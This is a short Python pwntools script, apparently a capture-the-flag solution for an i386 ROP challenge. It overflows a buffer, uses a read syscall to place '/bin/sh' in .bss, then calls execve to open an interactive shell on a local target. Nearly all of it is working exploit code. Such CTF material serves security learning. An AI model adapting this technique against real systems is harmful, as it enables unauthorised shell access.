# -*- coding: utf-8 -*-
#!/usr/bin/env python

# Don't know how it work
# Author by https://github.com/zszcr/pwnresource/blob/e088ca765c6e0e8e28fa67988aaa41f28129228a/Sorceboard/pwn/rop2/exp.py

from pwn import *

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = True

host = ""
port = 0
if is_local:
    host = "127.0.0.1"
    port = 8888
r = remote(host, port)

input("Attach in gdb and press Enter")

syscall_plt = 0x8048320
sub_overflow = 0x8048454
bss = 0x804a020

payload = flat(["A" * 16, syscall_plt, sub_overflow, p32(0x3), p32(0x0), p32(bss), p32(0x8)])
r.recvuntil(":")
log.info("payload: " + str(payload))
r.send(payload)
r.send(b"/bin/sh\x00")

payload = flat(["A" * 16, syscall_plt, sub_overflow, p32(0xb), p32(bss), p32(0), p32(0)])
log.info("payload: " + str(payload))
r.send(payload)

r.interactive("Pwned # ")

